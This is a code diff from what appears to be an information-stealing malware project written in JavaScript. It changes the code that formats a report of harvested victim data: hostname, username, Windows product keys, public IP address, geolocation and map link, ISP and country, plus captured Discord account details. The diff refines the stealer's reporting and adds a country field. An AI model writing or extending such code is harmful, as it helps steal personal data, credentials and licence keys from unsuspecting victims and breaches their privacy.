@@ -25,21 +25,24 @@ const json = async (zipFile) => {
     ['👨 Name', code(os.hostname())],
     ['🕘 Uptime', `<t:${uptime}:R> (<t:${uptime}:f>)`],
     ['🥷 Username', code(os.userInfo().username)],
-    ['🔄 OS version', getNameAndVersion().name + ' ' + getNameAndVersion().version],
+    ['🔢 OS version', getNameAndVersion().name + ' ' + getNameAndVersion().version],
     ['🔑 Product Key', code(require('./product-key').productKey)],
     ['🔑 Backup Product Key', code(require('./product-key').backupProductKey)],
   ];
   const ipInfoFields = [
-    ['1️⃣ IP Address', `[${code(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
+    ['🌐 IP Address', `[${code(await ipInfo('query'))}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
     ['🗺️ Location', `[${code(await ipInfo('lat') + ', ' + await ipInfo('lon'))}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
     ['ISP', code(await ipInfo('isp'))],
+    ['🏴 Country', await ipInfo('country') + ' :flag_' + (await ipInfo('countryCode')).toLowerCase() + ':'],
   ];
 
   const embeds = [];
   embeds.push({
-    description:
-      computerInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n') + '\n\n' +
-      ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n')
+    description: 'Taken ' + Math.floor((Date.now() - startTime) / 1000) + ' seconds',
+    fields: [
+      { name: '💻 Computer Info', value: computerInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n'), inline: true },
+      { name: 'IP Info', value: ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n'), inline: true },
+    ]
   });
 
   if (discordAccountInfo.accounts?.length >= 1) {
